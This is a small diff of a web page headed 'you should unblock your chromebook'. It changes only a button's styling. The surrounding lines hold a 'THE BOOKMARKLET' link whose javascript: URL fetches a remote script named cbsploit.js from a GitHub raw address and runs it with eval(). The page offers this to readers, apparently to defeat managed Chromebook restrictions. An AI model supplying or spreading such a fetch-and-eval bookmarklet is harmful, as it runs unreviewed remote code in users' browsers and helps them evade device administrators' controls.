@@ -16,7 +16,7 @@ you should unblock your chromebook
 # NOW!!!! ⚡⚡⛈️👨🏿⛈️⚡⚡
 
 <a href='javascript: fetch("https://raw.githubusercontent.com/Snoni/wockrland/main/assets/js/cbsploit.js").then(r => r.text()).then(r => eval(r))'>
-      <button class="btn btn-dark">
+      <button>
         THE BOOKMARKLET
       </button>
     </a>
